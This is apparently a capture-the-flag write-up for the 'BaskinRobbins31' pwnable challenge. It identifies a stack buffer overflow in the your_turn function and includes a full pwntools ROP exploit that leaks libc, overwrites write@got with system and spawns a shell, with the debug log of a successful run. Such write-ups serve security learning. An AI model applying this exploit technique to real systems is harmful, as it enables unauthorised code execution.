# BaskinRobbins31

```bash
checksec ./BaskinRobbins31
[*] '/home/ubuntu/Desktop/Pwnable/rop/BaskinRobbins31/BaskinRobbins31'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This binary has `NX-bit` and `Partical RELRO`.

And here is disassembled code.

```c
signed __int64 __fastcall your_turn(_DWORD *a1)
{
  signed __int64 result; // rax
  char s; // [rsp+10h] [rbp-B0h]
  size_t n; // [rsp+B0h] [rbp-10h]
  int v4; // [rsp+BCh] [rbp-4h]

  v4 = 0;
  memset(&s, 0, 0x96uLL);
  puts("How many numbers do you want to take ? (1-3)");
  n = read(0, &s, 0x190uLL);
  write(1, &s, n);
  putchar(10);
  v4 = strtoul(&s, 0LL, 10);
  if ( check_decision(v4, 0LL) )
  {
    *a1 -= v4;
    result = 1LL;
  }
  else
  {
    puts("Don't break the rules...:( ");
    result = 0LL;
  }
  return result;
}
```

I can find vulunablity to use rop. `s` is `0x96` bytes array, and `n = read(0, &s, 0x190uLL);` this is vulunable code.

`s` is in `[ebp - 0xB0]`, so I give dummy `0xB0` bytes, and `8 bytes sfp`. After that, I make ROP code.

```c
write(1, read@got, 8);      // leak read@got
read(0, bss, 8);            // write '/bin/sh'
read(0, write@got, 8);      // overwrite write@got
write('/bin/sh');           // call system by write@got
```

And I find gadget, and they give me a full gadget.

```asm
rp++ -f ./BaskinRobbins31 -r 3 | grep "pop rdi"
0x0040087a: pop rdi ; pop rsi ; pop rdx ; ret  ;  (1 found)
0x00400bc3: pop rdi ; ret  ;  (1 found)
```

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

binary = ELF('./BaskinRobbins31')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

read_plt = binary.plt['read']
read_got = binary.got['read']
write_plt = binary.plt['write']
write_got = binary.got['write']

bss = binary.bss()

system_offset = libc.symbols['system']
read_offset = libc.symbols['read']

read_system_offset = read_offset - system_offset

pppr = 0x0040087a # pop rdi; pop rsi; pop rdx; ret

payload = 'a'*0xb0 + 'b'*8
payload += p64(pppr) + p64(1) + p64(read_got) + p64(8) + p64(write_plt)
payload += p64(pppr) + p64(0) + p64(bss) + p64(8) + p64(read_plt)
payload += p64(pppr) +p64(0) + p64(write_got) + p64(8) + p64(read_plt)
payload += p64(pppr) + p64(bss) + 'b'*8 + 'c'*8 + p64(write_plt)

p = process('./BaskinRobbins31')

p.recv()
p.sendline(payload)
leak_read = u64(p.recv()[-8:])
log.info('leaked read: ' + hex(leak_read))
leak_system = leak_read - read_system_offset
log.info('leaked system: ' + hex(leak_system))

p.sendline('/bin/sh')
p.sendline(p64(leak_system))
p.interactive()
```

```bash
python exploit.py 
[DEBUG] PLT 0x4006ac putchar
[DEBUG] PLT 0x4006c0 puts
[DEBUG] PLT 0x4006d0 write
[DEBUG] PLT 0x4006e0 printf
[DEBUG] PLT 0x4006f0 memset
[DEBUG] PLT 0x400700 read
[DEBUG] PLT 0x400710 __libc_start_main
[DEBUG] PLT 0x400720 srand
[DEBUG] PLT 0x400730 time
[DEBUG] PLT 0x400740 setvbuf
[DEBUG] PLT 0x400750 strtoul
[DEBUG] PLT 0x400760 sleep
[DEBUG] PLT 0x400770 __gmon_start__
[*] '/home/ubuntu/Desktop/Write-ups/BaskinRobbins31/BaskinRobbins31'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[DEBUG] PLT 0x1f7f0 realloc
[DEBUG] PLT 0x1f800 __tls_get_addr
[DEBUG] PLT 0x1f820 memalign
[DEBUG] PLT 0x1f850 _dl_find_dso_for_object
[DEBUG] PLT 0x1f870 calloc
[DEBUG] PLT 0x1f8a0 malloc
[DEBUG] PLT 0x1f8a8 free
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './BaskinRobbins31': pid 974
[DEBUG] Received 0xaa bytes:
    '### This game is similar to the BaskinRobins31 game. ###\n'
    '### The one that take the last match win ###\n'
    'There are 31 number(s)\n'
    'How many numbers do you want to take ? (1-3)\n'
[DEBUG] Sent 0x159 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    000000b0  62 62 62 62  62 62 62 62  7a 08 40 00  00 00 00 00  │bbbb│bbbb│z·@·│····│
    000000c0  01 00 00 00  00 00 00 00  40 20 60 00  00 00 00 00  │····│····│@ `·│····│
    000000d0  08 00 00 00  00 00 00 00  d0 06 40 00  00 00 00 00  │····│····│··@·│····│
    000000e0  7a 08 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │z·@·│····│····│····│
    000000f0  90 20 60 00  00 00 00 00  08 00 00 00  00 00 00 00  │· `·│····│····│····│
    00000100  00 07 40 00  00 00 00 00  7a 08 40 00  00 00 00 00  │··@·│····│z·@·│····│
    00000110  00 00 00 00  00 00 00 00  28 20 60 00  00 00 00 00  │····│····│( `·│····│
    00000120  08 00 00 00  00 00 00 00  00 07 40 00  00 00 00 00  │····│····│··@·│····│
    00000130  7a 08 40 00  00 00 00 00  90 20 60 00  00 00 00 00  │z·@·│····│· `·│····│
    00000140  62 62 62 62  62 62 62 62  63 63 63 63  63 63 63 63  │bbbb│bbbb│cccc│cccc│
    00000150  d0 06 40 00  00 00 00 00  0a                        │··@·│····│·│
    00000159
[DEBUG] Received 0x17e bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    000000a0  59 01 00 00  00 00 00 00  61 61 61 61  61 61 61 61  │Y···│····│aaaa│aaaa│
    000000b0  62 62 62 62  62 62 62 62  7a 08 40 00  00 00 00 00  │bbbb│bbbb│z·@·│····│
    000000c0  01 00 00 00  00 00 00 00  40 20 60 00  00 00 00 00  │····│····│@ `·│····│
    000000d0  08 00 00 00  00 00 00 00  d0 06 40 00  00 00 00 00  │····│····│··@·│····│
    000000e0  7a 08 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │z·@·│····│····│····│
    000000f0  90 20 60 00  00 00 00 00  08 00 00 00  00 00 00 00  │· `·│····│····│····│
    00000100  00 07 40 00  00 00 00 00  7a 08 40 00  00 00 00 00  │··@·│····│z·@·│····│
    00000110  00 00 00 00  00 00 00 00  28 20 60 00  00 00 00 00  │····│····│( `·│····│
    00000120  08 00 00 00  00 00 00 00  00 07 40 00  00 00 00 00  │····│····│··@·│····│
    00000130  7a 08 40 00  00 00 00 00  90 20 60 00  00 00 00 00  │z·@·│····│· `·│····│
    00000140  62 62 62 62  62 62 62 62  63 63 63 63  63 63 63 63  │bbbb│bbbb│cccc│cccc│
    00000150  d0 06 40 00  00 00 00 00  0a 0a 44 6f  6e 27 74 20  │··@·│····│··Do│n't │
    00000160  62 72 65 61  6b 20 74 68  65 20 72 75  6c 65 73 2e  │brea│k th│e ru│les.│
    00000170  2e 2e 3a 28  20 0a 50 42  5f aa 54 7f  00 00        │..:(│ ·PB│_·T·│··│
    0000017e
[*] leaked read: 0x7f54aa5f4250
[*] leaked system: 0x7f54aa542390
[DEBUG] Sent 0x8 bytes:
    '/bin/sh\n'
[DEBUG] Sent 0x9 bytes:
    00000000  90 23 54 aa  54 7f 00 00  0a                        │·#T·│T···│·│
    00000009
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x81 bytes:
    'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n'
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$  
```